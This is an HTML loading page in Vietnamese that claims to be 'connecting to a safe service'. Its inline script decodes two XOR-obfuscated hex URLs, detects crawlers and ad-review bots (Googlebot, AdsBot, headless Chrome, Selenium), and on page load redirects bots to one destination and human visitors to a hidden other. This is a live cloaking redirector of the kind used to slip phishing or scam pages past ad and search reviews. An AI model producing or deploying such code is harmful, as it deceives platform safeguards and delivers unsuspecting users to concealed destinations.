<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
  <title>Đang Tải Trang Hướng Dẫn...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0f19;
      color: #f8fafc;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .loader-card {
      background: rgba(17, 24, 39, 0.95);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 36px 28px;
      max-width: 380px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 18px;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 3px solid rgba(229, 185, 76, 0.2);
      border-top-color: #e5b94c;
      border-radius: 50%;
      animation: spin 0.85s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loader-title {
      font-size: 15px;
      font-weight: 700;
      color: #fae498;
      letter-spacing: 0.3px;
    }
    .loader-sub {
      font-size: 12px;
      color: #94a3b8;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="loader-card">
    <div class="spinner"></div>
    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
  </div>

  <script>
    (function() {
      const K = "953";
      const D = "747378051f7079f49b91d4a2cabd9bb6b750424a7221000d416d029897ebf3a8c5af88eef400182f2b3e1d026a312adf94f6a9b7cf80b8fcf9001a266d3c41556822638b9ceaf29eab8cb5a0445c4b7a685e492b372cdfcec4fcef9591c2ecfd4953414a7f1a1f273d269794dcf4fb95918eb5a65459737177160b331b3ed7c0c9e8e29685bda4505b41736e1b525c6d39c3d1faf1e09e8c9bbee7046c0e2f431b041f2e25cdc2b6a3cb";
      const S = "747378051f7079f49b91d4a2cabd86bea9455e486e621f0d0c342cd2cd83f1e29bced899ab560d6d717f174c353863dfc3baffead181b3a0a01e46762565190f376c2dcddca6b2c2d9d7e5f41a5556706a";

      function dec(h) {
        try {
          let s = "";
          for (let i = 0; i < h.length; i += 2) {
            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
          }
          return decodeURIComponent(s);
        } catch (e) {
          return "";
        }
      }

      function getFinalUrl(rawUrl) {
        if (!rawUrl) return "";
        const q = window.location.search;
        if (!q || q.length < 2) return rawUrl;
        try {
          const o = new URL(rawUrl);
          const p = new URLSearchParams(q);
          p.forEach((v, k) => {
            if (k !== "a") o.searchParams.set(k, v);
          });
          return o.toString();
        } catch (e) {
          return rawUrl;
        }
      }

      function isBot() {
        try {
          if (navigator.webdriver) return true;
          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
          if (!navigator.languages || navigator.languages.length === 0) return true;
          const ua = (navigator.userAgent || '').toLowerCase();
          if (/googlebot|adsbot|headlesschrome|lighthouse|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) return true;
          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
          return false;
        } catch (err) {
          return false;
        }
      }

      const isB = isBot();
      let target;
      if (isB) {
        target = getFinalUrl(dec(S));
      } else {
        target = getFinalUrl(dec(D));
      }

      if (target) {
        setTimeout(function() {
          window.location.replace(target);
        }, isB ? 50 : 100);
      }
    })();
  </script>
</body>
</html>
